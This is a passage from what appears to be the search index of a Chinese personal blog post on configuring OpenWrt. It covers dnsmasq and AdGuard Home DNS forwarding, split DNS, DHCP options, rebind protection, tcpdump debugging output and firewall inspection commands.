<li>p.s\u8981\u5141\u8bb8wan\u8bbf\u95ee\uff0c\u540c\u65f6\u9700\u8981\u5f00\u542f\u9632\u706b\u5899 <pre><code>option localservice '0'\n</code></pre></li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u8f6c\u53d1\u8bf7\u6c42","title":"\u8f6c\u53d1\u8bf7\u6c42","text":"<ul> <li>\u8f6c\u53d1\u7ed9\u5176\u5b83dns</li> <li>\u4e0b\u9762\u662fopenclash\u9009\u62e9\u4e86\u91cd\u5b9a\u5411dnsmasq\u540e\u7684\u914d\u7f6e\u3002\u53ef\u4ee5\u5173\u95ed\u540e\u624b\u52a8\u7ef4\u62a4\uff08\u4fbf\u4e8e\u5207\u6362\u5230adguard home\u7b49\u5176\u5b83dns\uff09</li> <li>noresolv\u8868\u793a\u4e0d\u4f7f\u7528\u4e0a\u6e38dns</li> <li>cachesize=0\uff0c\u8868\u793a\u7981\u7528\u7f13\u5b58\uff0c\u6bcf\u4e2adns\u8bf7\u6c42\u90fd\u88ab\u8f6c\u53d1\u7ed9openclash <pre><code>config dnsmasq\n      ...\n      list server '127.0.0.1#7874'\n      option noresolv '1'\n      option cachesize '0'\n</code></pre></li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dhcp-option","title":"dhcp option","text":"<ul> <li>3\uff1a\u8bbe\u7f6e\u9ed8\u8ba4\u7f51\u5173</li> <li>6\uff1a\u8bbe\u7f6edns</li> <li>\u65e0\u6cd5\u6307\u5b9a\u7aef\u53e3</li> </ul> <p>luci\uff1ainterface -&gt; lan -&gt; edit ... \u914d\u7f6e\u6587\u4ef6\uff1adhcp <pre><code>config dhcp 'lan'\n    ...\n    list dhcp_option '6,192.168.36.1'\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dns\u5206\u6d41","title":"dns\u5206\u6d41","text":"<p>\u4ee5\u4e0b\u8bbe\u7f6e\u9ed8\u8ba4\u5c06dns\u8f6c\u53d1\u7ed9<code>127.0.0.1:7874</code>\uff08clash dns\uff09\uff0c\u5bf9\u4e8e<code>*.my.to</code>\u8f6c\u53d1\u7ed9119.29.29.29 <pre><code>option localservice '0'\n        option port '53'\n        #option resolvfile '/tmp/resolv.conf.d/resolv.conf.auto'\n        option noresolv '1'\n        option serverlist '/etc/dnsmasq.servers'\n        list server '127.0.0.1#7874'\n        list server '/my.to/119.29.29.29'\n        list server '/us.to/119.29.29.29'\n        list server '/zhenwei.site/119.29.29.29'\n        list server '119.29.29.29'\n        option cachesize '500'\n</code></pre></p> <p>\u6216\u8005\u5728\u5355\u72ec\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e <pre><code>option confdir '/etc/dnsmasq.d'\n\nvim /etc/dnsmasq.d/dnsmasq_accelerated-domains.china.conf\n\nserver=/baidu.cc/202.38.64.56\nserver=/baidu.cm/202.38.64.56\nserver=/baidu.com/202.38.64.56\nserver=/baidu.jp/202.38.64.56\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#bind\u63a5\u53e3\u548c\u975e\u5c40\u57df\u7f51\u8bbf\u95ee","title":"bind\u63a5\u53e3\u548c\u975e\u5c40\u57df\u7f51\u8bbf\u95ee","text":"<p>\u5bb9\u6613\u641e\u6df7\u7684\u9009\u9879 - localise_queries(1): Choose\u00a0IP\u00a0address to match the incoming interface if multiple addresses are assigned to a host name in\u00a0<code>/etc/hosts</code>. Initially\u00a0disabled, but still\u00a0enabled\u00a0in the config by default.\u00a0\u00a0Note well the spelling of this option. - localservice(0): Accept\u00a0DNS\u00a0queries only from hosts whose address is on a local subnet, ie a subnet for which an interface exists on the server.</p> <p>dnsmasq\u9ed8\u8ba4\u76d1\u542c\u6240\u6709\u63a5\u53e3\uff08\u4f46\u662f\u4e0d\u662fbind\u5230<code>::</code>\uff0c\u800c\u662fbind\u6240\u6709\u672c\u5730\u5730\u5740\uff09 localservice\u63a7\u5236\u662f\u5426\u5141\u8bb8\u5176\u5b83\u7f51\u6bb5\u8bbf\u95ee\u3002\u6bd4\u8f83\u7279\u522b\u7684\u662f\uff0c\u5982\u679c\u624b\u52a8\u6307\u5b9a\u4e86bind interface\uff0c\u5219\u9664\u4e86\u5f00\u542flocalservice\uff0c\u8fd8\u9700\u8981\u4fdd\u8bc1\u7ed1\u5b9a\u4e86\u5bf9\u5e94\u63a5\u53e3\u3002 <pre><code>list interface wg_s2s\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u4e00\u4e9b\u914d\u7f6e\u9009\u9879\u8bf4\u660e","title":"\u4e00\u4e9b\u914d\u7f6e\u9009\u9879\u8bf4\u660e","text":"<ul> <li><code>noresolv 0</code>: Don't read upstream servers from\u00a0<code>/etc/resolv.conf</code>\u00a0which is linked to\u00a0<code>resolvfile</code>\u00a0by default</li> <li> <p><code>resolvfile /tmp/resolv.conf.d/resolv.conf.auto</code>: \u00a0tells\u00a0dnsmasq\u00a0to use this file to find upstream name servers; it gets created by the\u00a0WAN\u00a0DHCP\u00a0or PPP client.</p> </li> <li> <p><code>rebind_protection 1</code>: Enables\u00a0DNS\u00a0rebind attack protection by discarding upstream RFC1918 responses DNS rebinding protection - Google Nest Help</p> </li> <li> <p>\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u6076\u610f\u7f51\u7ad9\u65f6\uff0c\u6076\u610f\u7f51\u7ad9\u52a8\u6001\u5730\u5c06\u81ea\u5df1\u7684\u57df\u540d\u7ed1\u5b9a\u5230\u7528\u6237\u79c1\u6709\u5730\u5740\uff0c\u8fd9\u6837\u7528\u6237\u5c31\u4f1a\u53bb\u8bbf\u95ee\u672c\u5730\u7f51\u7edc\u3002\u4ece\u800c\u6076\u610f\u7f51\u7ad9\u53ef\u80fd\u83b7\u53d6\u7528\u6237\u7684\u79c1\u6709\u4fe1\u606f\u3002</p> <p>A DNS rebinding attack is performed when a malicious website pretends that\u00a0IP addresses\u00a0(usually IPs reserved for local networks) are part of their domain. This allows them to circumvent the same-origin policy implemented by browsers and view data from these IP addresses. A DNS rebinding attack can happen if someone using your network visits a malicious website that identifies your local IP address and deduces the structure of your local network. The malicious website could then bind their domains to the local IP address, send requests to devices on your network, and then read any responses to those requests. This could allow attackers to access some of your private information, or further compromise your network security.</p> </li> <li> <p><code>allservers 0</code>: By default, when dnsmasq has more than one upstream server available, it will send queries to just one server. Setting this parameter forces dnsmasq to send all queries to all available servers. The reply from the server which answers first will be returned to the original requeser.</p> </li> </ul> <p>rebind_protection\u5bfc\u81f4\u65e0\u6cd5\u8fd4\u56de\u5c40\u90e8\u5730\u5740\u3002 <pre><code>19:43:37.091228 IP 127.0.0.1.51697 &gt; 127.0.0.1.53: 15907+ A? jellyfin.yfycloud.top. (39)\n19:43:37.091314 IP 10.0.32.2.47023 &gt; 192.168.35.1.53: 50832+ A? jellyfin.yfycloud.top. (39)\n19:43:37.091349 IP 127.0.0.1.51697 &gt; 127.0.0.1.53: 16164+ AAAA? jellyfin.yfycloud.top. (39)\n19:43:37.091388 IP 10.0.32.2.33248 &gt; 192.168.35.1.53: 53062+ AAAA? jellyfin.yfycloud.top. (39)\n19:43:37.092516 IP 192.168.35.1.53 &gt; 10.0.32.2.33248: 53062 1/0/0 AAAA :: (67)\n19:43:37.092518 IP 192.168.35.1.53 &gt; 10.0.32.2.47023: 50832 1/0/0 A 192.168.35.2 (55)\n19:43:37.092643 IP 127.0.0.1.53 &gt; 127.0.0.1.51697: 15907 0/0/0 (39)\n19:43:37.092713 IP 127.0.0.1.53 &gt; 127.0.0.1.51697: 16164 0/0/0 (39)\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9012\u5f52\u5faa\u73af","title":"\u9012\u5f52\u5faa\u73af","text":"<pre><code>root@op2 \u279c  ~ nslookup debian12-docker.op2\nServer:         127.0.0.1\nAddress:        127.0.0.1:53\n\nName:   debian12-docker.op2\nAddress: 192.168.36.137\n\n** server can't find debian12-docker.op2: SERVFAIL   # \u4e5f\u53ef\u80fd\u662fno answer\n</code></pre> <pre><code>root@op2 \u279c  ~ tcpdump -ni any udp port 53 |grep debian\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes\n10:42:06.385808 IP 127.0.0.1.53119 &gt; 127.0.0.1.53: 51457+ A? debian12-docker.op2. (37)\n10:42:06.385822 IP 127.0.0.1.53119 &gt; 127.0.0.1.53: 51714+ AAAA? debian12-docker.op2. (37)\n10:42:06.388495 IP 10.0.32.2.53348 &gt; 192.168.35.1.53: 13219+ AAAA? debian12-docker.op2. (37)\n10:42:06.389850 IP 10.0.32.1.59871 &gt; 192.168.36.1.53: 7106+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:06.389983 IP 10.0.32.2.39748 &gt; 192.168.35.1.53: 20089+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:06.391086 IP 10.0.32.1.37076 &gt; 192.168.36.1.53: 37382+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.889751 IP 127.0.0.1.53119 &gt; 127.0.0.1.53: 51714+ AAAA? debian12-docker.op2. (37)\n10:42:08.890363 IP 10.0.32.2.53348 &gt; 192.168.35.1.53: 13219+ AAAA? debian12-docker.op2. (37)\n10:42:08.892259 IP 10.0.32.1.59755 &gt; 192.168.36.1.53: 7106+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.892541 IP 10.0.32.2.39748 &gt; 192.168.35.1.53: 20089+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.894341 IP 10.0.32.1.33708 &gt; 192.168.36.1.53: 37382+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.894564 IP 10.0.32.2.39748 &gt; 192.168.35.1.53: 20089+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.896553 IP 10.0.32.1.48899 &gt; 192.168.36.1.53: 37382+ [1au] AAAA? debian12-docker.op2. (48)\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dnsadguardhome","title":"DNS/Adguardhome","text":"<p>\u4f7f\u7528Adguardhome\u4ee3\u66ffdnsmasq\u6709\u4e00\u4e9b\u597d\u5904 - \u66f4\u5bb9\u6613\u8fdb\u884cdns\u5206\u6d41 - \u7f8e\u89c2\u7684\u63a7\u5236\u9762\u677f\uff0c\u53ef\u4ee5\u770b\u5230\u7edf\u8ba1\u4fe1\u606f - \u4e00\u4e9b\u9ad8\u7ea7\u7684dns filtering\u64cd\u4f5c\uff1ablock\u57df\u540d\uff0c\u8fd4\u56de\u6307\u5b9aip</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5b89\u88c5_1","title":"\u5b89\u88c5","text":"<p><pre><code>opkg install adguardhome\n\n# \u542f\u52a8\u670d\u52a1\nservice adguardhome start\n</code></pre> \u521d\u6b21\u5b89\u88c5\u9700\u8981\u8bbf\u95ee<code>&lt;ip_address&gt;:3000</code>\u8fdb\u884c\u521d\u59cb\u914d\u7f6e\u3002\u914d\u7f6e\u5b8c\u6210\u540e\u5728<code>/etc/adguardhome.yaml</code>\u4e2d\u751f\u6210\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u6211\u4eec\u9700\u8981\u4f7f\u7528adguardhome\u4f5c\u4e3a\u4e3bdns\uff0c\u56e0\u6b64\u4fee\u6539\u539f\u672cdnsmasq\uff0c\u7ed1\u5b9a\u523054\u7aef\u53e3\u3002 <pre><code># vim /etc/config/dhcp\n\nconfig dnsmasq\n  ...\n  option port '54'\n  option cachesize '1000'\n  option rebind_protection '0'\n</code></pre></p> <p>\u6700\u540e\uff0c\u4fee\u6539adguradhome\u914d\u7f6e\u6587\u4ef6<code>/etc/adguardhome.yaml</code>\uff0c\u7ed1\u5b9a\u5230\u5c40\u57df\u7f51 <pre><code>dns:\n  bind_hosts:\n    - 127.0.0.1\n    - 192.168.36.1\n  port: 53\n</code></pre> <code>service adguardhome restart</code>\u91cd\u542f\u670d\u52a1</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#bind\u63a5\u53e3ip","title":"bind\u63a5\u53e3/ip","text":"<p>PD\u60c5\u51b5\u4e0b\uff0cohcpd\u4f1a\u5c06br-lan\u7684PD ip\u4f5c\u4e3aDNS\u54cd\u5e94\u7ed9lan\u5185\u8bbe\u5907\u3002\u4f46\u662fadguardhome dns\u9ed8\u8ba4\u6ca1\u6709\u76d1\u542c\u8be5ip\u3002 \u800c\u7531\u4e8ePD\u53ef\u80fd\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u56e0\u6b64\u4e5f\u6ca1\u529e\u6cd5\u624b\u52a8\u8bbe\u7f6e\uff08Adguardhome\u5e76\u4e0d\u652f\u6301bind\u5230\u6307\u5b9a\u63a5\u53e3\uff0c\u53ea\u80fd\u6307\u5b9a\u5177\u4f53ip\uff09 \u4e00\u4e2a\u53ef\u4ee5\u7684\u89e3\u51b3\u529e\u6cd5\u662f\uff1aodhcp\u4e2d\u8bbe\u7f6eDNS\u4e3afe80\u5730\u5740\uff0c\u7136\u540e\u5728AG\u4e2d\u8bbe\u7f6e\u7ed1\u5b9a\u5230\u8be5\u5730\u5740\u3002\u6ce8\u610f\uff1a\u7531\u4e8efe80\u5730\u5740\u53ef\u4ee5\u91cd\u590d\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528<code>%</code>\u683c\u5f0f\u6307\u5b9a\u63a5\u53e3\u3002 <pre><code>  bind_hosts:\n    - 192.168.35.1\n    - 127.0.0.1\n    - ::1   # ipv6\u7248\u672c\u7684127.0.0.1\uff0c\u53ea\u80fd\u672c\u673a\u8bbf\u95ee\n    - fe80::216:3eff:fe4b:6780%br-lan\n</code></pre></p> <p>\u76d1\u542c\u6240\u6709\u63a5\u53e3\uff08\u5305\u542bipv6\uff09 <pre><code>bind_hosts:\n   - 0.0.0.0\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dns\u8bbe\u7f6e","title":"dns\u8bbe\u7f6e","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\u914d\u7f6e\u4e0a\u6e38dns(upstream dns) - GUI\u914d\u7f6e - \u914d\u7f6e\u6587\u4ef6<code>upstream_dns</code> - \u914d\u7f6e\u6587\u4ef6<code>upstream_dns_file: /usr/share/adguardhome.upstream</code>   - \u4f1a\u7981\u7528upstream_dns\u5e76\u4e14GUI\u4e2d\u65e0\u6cd5\u770b\u5230</p> <p>\u591a\u4e2adns\u6709\u4ee5\u4e0b\u7b56\u7565 </p> <p>\u5bf9\u5e94\u914d\u7f6e\u6587\u4ef6\u4e2d\u4ee5\u4e0b\u9009\u9879 - <code>all_servers</code>: Enables parallel queries to all configured upstream servers to speed up resolving. If enabled, the queries are sent to each server simultaneously and the first response is chosen. If disabled, the queries are sent to each upstream server one-by-one and then sorted by RTT. Note that more stable upstream servers are preferred by the algorithm. - <code>fastest_addr</code>: Use the Fastest Address algorithm. It finds an IP address with the lowest latency and returns this IP address in DNS response.</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dns\u5206\u6d41_1","title":"dns\u5206\u6d41","text":"<p>\u53ef\u4ee5\u6839\u636e\u57df\u540d\u9009\u62e9\u4f7f\u7528\u4e0d\u540cdns\u3002 Configuration \u00b7 AdguardTeam/AdGuardHome Wiki (github.com)</p> <p><code>/etc/adguardhome.yaml</code>\u4e2d\u542f\u7528\u4e0a\u6e38dns\u6587\u4ef6 - <code>upstream_dns_file</code>: Path to a file with the list of upstream DNS servers. If it is configured, the value of\u00a0<code>upstream_dns</code>\u00a0is ignored. <pre><code>dns:\n  upstream_dns_file: /usr/share/adguardhome.upstream   \n</code></pre></p> <p><code>/usr/share/adguardhome.upstream</code>\u8bbe\u7f6e\u4e0a\u6e38dns - <code>[xxx]#</code>: <code>#</code>\u8868\u793a\u4f7f\u7528\u9ed8\u8ba4dns - <code>[*.my.to]</code>\u548c<code>[my.to]</code>\u6709\u4e00\u4e9b\u533a\u522b\u3002\u524d\u8005\u5fc5\u987b\u662fmy.to\u7684\u5b50\u57df\u540d\uff0c\u4e0d\u5305\u62ecmy.to\u81ea\u8eab\uff0c\u800c\u540e\u8005\u5305\u542b\u81ea\u8eab\u53ca\u5b50\u57df\u540d\u3002 <pre><code># Default\n127.0.0.1:7874    # clash dns\uff0c\u5173\u95edipv6\u89e3\u6790\n\n# my network\n[/lan/]127.0.0.1:54   # \u5c40\u57df\u7f51\u8bbe\u5907 *.lan\u89e3\u6790\n\n[/my.to/]202.38.64.56  # \u4f7f\u7528\u5b66\u6821dns\uff0c\u5728\u65e0\u7f51\u7edc\u65f6\u89e3\u6790\u8def\u7531\u5668ipv6\uff0c\u7528\u4e8e\u5efa\u7acbwg\n[/us.to/]202.38.64.56\n\n# \u5176\u4f59\u9700\u8981ipv6\u57df\u540d\n[/pt/]119.29.29.29\n[/ipw.cn/]119.29.29.29  # \u53cc\u6808\uff0c\u6d4b\u8bd5\u7528\n[/wikipedia.org/]119.29.29.29\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#filters\u81ea\u5b9a\u4e49\u57df\u540d\u89e3\u6790","title":"filters/\u81ea\u5b9a\u4e49\u57df\u540d\u89e3\u6790","text":"<p>Hosts Blocklists \u00b7 AdguardTeam/AdGuardHome Wiki (github.com)</p> <p>\u4f4d\u4e8e\u7f51\u9875Filters -&gt; custom filtering rules\u83dc\u5355\u4e2d\uff0c\u4ee5hosts\u6587\u4ef6\u7684\u683c\u5f0f\u8bbe\u7f6e\u57df\u540dip\u5373\u53ef\u3002 - \u8be5\u529f\u80fd\u8fd8\u652f\u6301\u5bf9\u57df\u540d\u8fdb\u884cblocking\uff0c\u89c1\u7f51\u9875\u4e2d\u7ed9\u51fa\u7684\u4f8b\u5b50\u3002 </p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u67d0\u4e9b\u57df\u540d\u53ea\u8fd4\u56deipv6","title":"\u67d0\u4e9b\u57df\u540d\u53ea\u8fd4\u56deipv6","text":"<p>Is it possible to return only the ipv6 address when having both ipv4 and ipv6 addresses \u00b7 AdguardTeam/AdGuardHome \u00b7 Discussion #4482 (github.com)</p> <pre><code>||internal.my-campus.edu^$dnstype=A,dnsrewrite=NOERROR\n</code></pre> <p>\u5173\u4e8e\u662f\u5426\u652f\u6301prefer_ipv4\u7684\u8ba8\u8bba\uff1aPrefer IPv4/6. However, it does not affect the resolution of pure IPv6/4 domain names. \u00b7 Issue #5919 \u00b7 AdguardTeam/AdGuardHome (github.com) - \u6709\u89c2\u70b9\u8ba4\u4e3a\u8fd9\u5e94\u8be5\u662fclient\u505a\u7684\u4e8b\u60c5</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u91cd\u542f\u540e\u65e0\u6cd5\u81ea\u542f\u52a8","title":"\u91cd\u542f\u540e\u65e0\u6cd5\u81ea\u542f\u52a8","text":"<p>\u662f\u7531\u4e8e\u542f\u52a8\u811a\u672c\u4f18\u5148\u7ea7\u51b2\u7a81\u5bfc\u81f4\u7684\u3002 AdguardHome doesn\u2019t start automatically \u89e3\u51b3\u65b9\u6cd5\u4e3a\u4fee\u6539procd\u542f\u52a8\u4f18\u5148\u7ea7: - \u5220\u9664\u542f\u52a8\u8f6f\u8fde\u63a5\uff08\u4f4d\u4e8e<code>/etc/rc.d/</code>\uff09 <pre><code>service adguardhome disable\n</code></pre> - \u4fee\u6539\u542f\u52a8\u811a\u672c\u4e2d\u7684START\u548cSTOP\u503c\uff0c<code>vim /etc/init.d/adguardhome</code> <pre><code>START=95\nSTOP=01\n\n## starts after network starts\n#START=21\n## stops before networking stops\n#STOP=89\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u8bbe\u5907\u65e0\u6cd5\u83b7\u5f97dns","title":"\u8bbe\u5907\u65e0\u6cd5\u83b7\u5f97dns","text":"<p>\u53d1\u73b0\u624b\u673a\u8bbe\u5907\u4e0d\u80fd\u83b7\u5f97dns\u4e86\uff0c\u663e\u793a\u4e3a\u8fde\u4e0awifi\u540e\u663e\u793a\u65e0\u6cd5\u4e0a\u7f51\uff0c\u6d4f\u89c8\u5668\u6253\u4e0d\u5f00\u7f51\u9875\uff0c\u4f46\u662fapp\u5e94\u7528\u8c8c\u4f3c\u90fd\u6ca1\u6709\u95ee\u9898\u3002 \u89e3\u51b3\u529e\u6cd5\u662f\u5728/etc/config/dhcp\u4e2d\u6dfb\u52a0dns option\uff0c\u5f3a\u884c\u8bbe\u7f6edns\u3002 <pre><code>config dhcp 'lan'\n    ...\n    list dhcp_option '6,192.168.36.1'\n</code></pre></p> <p>\u8bb0\u5f55\u4e0bdnsmasq\u7684\u8bbe\u7f6e\uff0c\u770b\u4e0b\u662f\u5426\u662f\u4e0d\u5c0f\u5fc3\u6539\u9519\u4e86\u3002 <pre><code>config dnsmasq\n        option domainneeded '1'\n        option localise_queries '1'\n        option local '/lan/'\n        option domain 'lan'\n        option expandhosts '1'\n        option authoritative '1'\n        option readethers '1'\n        option leasefile '/tmp/dhcp.leases'\n        option localservice '1'\n        option ednspacket_max '1232'\n        option rebind_protection '0'\n        option port '54'\n        option localuse '1'\n        list server '127.0.0.1#7874'\n        option noresolv '1'\n        option cachesize '0'\n</code></pre></p> <p>Getting ''bad udp cksum'' when running tcpdump (f5.com) tcpdump\u65f6\u53d1\u73b0\u4e00\u4e2a\u6709\u610f\u601d\u7684\u95ee\u9898\uff0cdhcp reply\u663e\u793abad udp cksum</p> <p>This is an expected behavior as tcpdump tool on Linux because the checksum is offloading on your NIC but tcpdump reads IP packets from the Linux kernel right before the actual checksum takes place in the NIC chipset.</p> <pre><code>root@op2 \u279c  ~ tcpdump -nvvv -i eth1 port 67 and port 68\ntcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes\n12:55:06.175120 IP (tos 0x0, ttl 128, id 28628, offset 0, flags [none], proto UDP (17), length 328)\n    192.168.36.180.68 &gt; 192.168.36.1.67: [udp sum ok] BOOTP/DHCP, Request from 28:11:a8:27:40:3e, length 300, xid 0xab30355a, Flags [none] (0x0000)\n          Client-IP 192.168.36.180\n          Client-Ethernet-Address 28:11:a8:27:40:3e\n          Vendor-rfc1048 Extensions\n            Magic Cookie 0x63825363\n            DHCP-Message Option 53, length 1: Request\n            Client-ID Option 61, length 7: ether 28:11:a8:27:40:3e\n            Hostname Option 12, length 6: \"S3-Pro\"\n            FQDN Option 81, length 9: \"S3-Pro\"\n            Vendor-Class Option 60, length 8: \"MSFT 5.0\"\n            Parameter-Request Option 55, length 14:\n              Subnet-Mask, Default-Gateway, Domain-Name-Server, Domain-Name\n              Router-Discovery, Static-Route, Vendor-Option, Netbios-Name-Server\n              Netbios-Node, Netbios-Scope, Option 119, Classless-Static-Route\n              Classless-Static-Route-Microsoft, Option 252\n            END Option 255, length 0\n            PAD Option 0, length 0, occurs 2\n12:55:06.175586 IP (tos 0xc0, ttl 64, id 38812, offset 0, flags [none], proto UDP (17), length 340)\n    192.168.36.1.67 &gt; 192.168.36.180.68: [bad udp cksum 0xcb57 -&gt; 0x4904!] BOOTP/DHCP, Reply, length 312, xid 0xab30355a, Flags [none] (0x0000)\n          Client-IP 192.168.36.180\n          Your-IP 192.168.36.180\n          Server-IP 192.168.36.1\n          Client-Ethernet-Address 28:11:a8:27:40:3e\n          Vendor-rfc1048 Extensions\n            Magic Cookie 0x63825363\n            DHCP-Message Option 53, length 1: ACK\n            Server-ID Option 54, length 4: 192.168.36.1\n            Lease-Time Option 51, length 4: 43200\n            RN Option 58, length 4: 19452\n            RB Option 59, length 4: 35652\n            Subnet-Mask Option 1, length 4: 255.255.255.0\n            BR Option 28, length 4: 192.168.36.255\n            Default-Gateway Option 3, length 4: 192.168.36.1\n            Domain-Name Option 15, length 3: \"lan\"\n            FQDN Option 81, length 13: [SO] 255/255 \"S3-Pro.lan\"\n            Domain-Name-Server Option 6, length 4: 192.168.36.1\n            END Option 255, length 0\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#upstream-dns-servers-settings","title":"Upstream DNS servers settings","text":"<ul> <li><code>bootstrap_dns</code>: List of DNS servers used for initial hostname resolution in case an upstream server name is a hostname.</li> <li> <p><code>bootstrap_prefer_ipv6</code>: If\u00a0<code>true</code>, instructs the bootstrapper to prefer IPv6 addresses to IPv4 ones when resolving DoH, DoQ, and DoT hostnames.</p> </li> <li> <p><code>all_servers</code>: Enables parallel queries to all configured upstream servers to speed up resolving. If enabled, the queries are sent to each server simultaneously and the first response is chosen. If disabled, the queries are sent to each upstream server one-by-one and then sorted by RTT. Note that more stable upstream servers are preferred by the algorithm.</p> </li> </ul> <p>DNS cache settings - <code>cache_size</code>\u00a0\u2014 DNS cache size (in bytes). - <code>cache_optimistic</code>\u00a0(since v0.107.0) \u2014 Make AdGuard Home respond from the cache even when the entries are expired and also try to refresh them. Before\u00a0v0.108.0-b.5\u00a0the TTL for such responses is 60 seconds and since\u00a0v0.108.0-b.5\u00a0it's 10 seconds.</p> <p>Other settings - <code>enable_dnssec</code>: Set DNSSEC flag in the outgoing DNS requests and check the result. - <code>aaaa_disabled</code>: Respond with an empty answer to all\u00a0<code>AAAA</code>\u00a0requests.</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9632\u706b\u5899","title":"\u9632\u706b\u5899","text":"<p>\u53c2\u8003 - fw3\u57fa\u4e8eiptable/netfilter\u5b9e\u73b0\uff1a[OpenWrt Wiki] Netfilter In OpenWrt - \u5728\u542f\u52a8\u65f6\u8fd0\u884ciptable\uff08firewall.user\uff09\uff1aExecuting scripts at boot time - Installing and Using OpenWrt - OpenWrt Forum</p> <p>\u4ece22.03\u7248\u672c\u5f00\u59cb\uff0copenwrt firwall\u540e\u7aef\uff0c\u4eceiptables(fw3)\u6362\u6210\u4e86nftables(fw4)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#nftable","title":"nftable","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>\u5feb\u901f\u5165\u95e8\uff1a[OpenWrt Wiki] nftables reference\uff1aMan page of NFT (netfilter.org)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u6253\u5370\u89c4\u5219","title":"\u6253\u5370\u89c4\u5219","text":"<p><code>fw4 print</code>\u00a0dumps the nftables configuration that is built by fw4 and passed to nftables. It contains slightly higher-level code than the raw nftables state: fw4 uses variables, include files\u2026</p> <p><code>nft list ruleset</code>\u00a0dumps the full nftables configuration from the kernel. This dump mixes data from different sources: -   rules generated by fw4 -   rules included from external files (<code>/etc/nftables.d/*.nft</code>\u00a0or\u00a0<code>/usr/share/nftables.d/</code>) -   rules added manually through the\u00a0<code>nft</code>\u00a0command</p> <p><code>fw3 print</code>\u00a0is the main utility to inspect iptable rules. Additionally the\u00a0<code>iptable</code>\u00a0command can be used to sort the rules differently and retrieve packet counts for matching rules. There are a number of arguments but the two most useful examples are: <pre><code>iptables -t &lt;table&gt; -vnL\niptables -t &lt;table&gt; -vS\n</code></pre> where -   table is one of:\u00a0<code>filter</code>\u00a0(default),\u00a0<code>nat</code>,\u00a0<code>mangle</code> -   <code>-v</code>: verbose, includes packet counts and physical interface name -   <code>-n</code>: numeric output -   <code>-L</code>: list rules -   <code>-S</code>: print rules The\u00a0<code>-L</code>\u00a0and\u00a0<code>-S</code>\u00a0arguments sort/format the output differently. The\u00a0<code>-S</code>\u00a0option is equivalent to using the\u00a0<code>iptable-save</code>\u00a0command.</p> <ul> 